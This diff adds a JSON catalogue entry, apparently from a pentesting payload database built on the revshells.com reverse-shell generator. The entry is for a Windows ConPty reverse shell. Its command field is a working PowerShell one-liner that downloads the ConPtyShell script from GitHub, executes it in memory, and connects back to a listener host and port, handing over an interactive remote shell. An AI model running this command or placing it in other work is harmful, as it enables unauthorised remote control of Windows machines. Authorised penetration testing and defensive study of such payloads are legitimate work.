@@ -1,0 +1,28 @@
+{
+  "id": "rsg-reverseshell-windows-conpty",
+  "name": "RSG · ReverseShell · Windows ConPty",
+  "command": "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <lhost> <lport>",
+  "description": "Reverse Shell payload — Windows ConPty (via reverse-shell-generator).",
+  "platform": "windows",
+  "tags": [
+    "rsg",
+    "payload",
+    "reverse-shell",
+    "windows"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "ReverseShell/Windows ConPty/36",
+  "category": "payloads",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
